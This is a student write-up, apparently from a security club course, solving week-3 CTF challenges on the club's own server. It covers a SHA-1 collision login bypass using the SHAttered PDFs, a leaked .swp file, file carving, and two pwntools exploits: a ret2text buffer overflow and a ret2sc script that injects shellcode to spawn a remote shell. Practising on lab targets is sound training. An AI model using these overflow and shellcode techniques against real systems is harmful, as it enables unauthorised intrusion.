---
###### tags: `Hackersir note`
---

# CTF Write-Up Week 3
## SHA-1
從sourse code中得知帳號和密碼的明文要不一樣可是SHA1要一樣，google ``sha1 collision``就可以看到[SHAttered](https://shattered.io/)這個網站，裡面寫了google和CWI如何把SHA1破解，而這題可以運用到裡面的兩個PDF檔。
```python=
import requests
url = 'http://ctf.hackersir.org:12003/'
My_file1 = open('shattered-1.pdf','rb')
My_file2 = open('shattered-2.pdf','rb')
My_data = {'username':My_file1.read(),'password':My_file2.read()}
r = requests.post(url, data = My_data)

print(r.text)
```
## temporary
[Sensitive Data Exposure](https://github.com/shenyenchun/hackersir_note/blob/master/Week%202/Web%20Security.md#%E6%9A%AB%E5%AD%98%E6%AA%94%E5%90%8D%E7%A8%B1)
``http://ctf.hackersir.org:10010/.index.html.swp``

## ret2text
[Return to Text](https://github.com/shenyenchun/hackersir_note/blob/master/Week%203/Pwn_1.md#return-to-text)
```python=
from pwn import *

#r = process("./ret2text")
r = remote('ctf.hackersir.org','10131')

p = 'a' * 0x18 + p64(Address)

r.send(p)

r.interactive()
```

## extract
[Acknowledge](https://www.cnblogs.com/bmjoker/p/9025351.html)

## Cat_OuO
先用binwalk下去分析貓貓，貓貓跟我說它裡面還有一個叫flag.png的朋友，所以用foremost拆解，就把貓貓的朋友請出來了~~~

## ret2sc
一開始執行程式他會噴出一個Address，之後要我們輸入東西，然後程式就結束了，從執行程式上找不到線索，只好用IDA打開看看，還原程式碼後，找不到shell的function，只知道他可以輸入0x70 bytes的內容，如題，我們需要自己手刻一段開啟shell的code，最後用ret2text的概念一樣，把我要執行的address 去cover rip，這樣就可以執行shell了。
[Read more](https://github.com/shenyenchun/hackersir_note/blob/master/Week%203/Pwn_1.md#return-to-shellcode)
```python=
from pwn import *

#r = process('./ret2sc')

r = remote('ctf.hackersir.org','10133')

ad = r.recvline()

ad = ad.split(': ')[1]

ad = int(ad,16)

context.arch = 'amd64'

sc = asm(shellcraft.sh()) + 'a' * 0x40 + p64(ad)

r.sendline(sc)
r.interactive()
```